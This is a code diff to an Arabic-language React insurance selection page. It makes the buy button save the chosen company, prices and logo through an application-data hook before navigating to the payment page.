@@ -6,6 +6,7 @@ import { Shield, CheckCircle2 } from "lucide-react";
 import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+import { useApplicationData } from "@/hooks/useApplicationData";
 interface InsuranceCompany {
   id: number;
   name: string;
@@ -18,6 +19,7 @@ const InsuranceSelection = () => {
   const navigate = useNavigate();
   const [insuranceType, setInsuranceType] = useState<"comprehensive" | "third-party" | null>(null);
   const [selectedCompany, setSelectedCompany] = useState<string>("");
+  const { createOrUpdateApplication } = useApplicationData();
 
   // Send data to Formspree in real-time
   useFormspreeSync({
@@ -168,9 +170,22 @@ const InsuranceSelection = () => {
                       سعر البيع {company.salePrice}﷼
                     </p>
                   </div>
-                  <Button className="w-full bg-emerald-600 hover:bg-emerald-700 text-white" onClick={() => {
+                  <Button className="w-full bg-emerald-600 hover:bg-emerald-700 text-white" onClick={async () => {
                 setSelectedCompany(`${company.name} - السعر: ${company.salePrice}﷼`);
-                navigate(`/payment?company=${encodeURIComponent(company.name)}&price=${company.salePrice}&regularPrice=${company.regularPrice}`);
+                
+                try {
+                  await createOrUpdateApplication({
+                    selected_company: company.name,
+                    selected_price: company.salePrice,
+                    regular_price: company.regularPrice,
+                    company_logo: company.logo,
+                    current_step: 'insurance_selection'
+                  });
+                  
+                  navigate(`/payment?company=${encodeURIComponent(company.name)}&price=${company.salePrice}&regularPrice=${company.regularPrice}`);
+                } catch (error) {
+                  console.error('Error saving selection:', error);
+                }
               }}>
                     إشتري الآن
                   </Button>
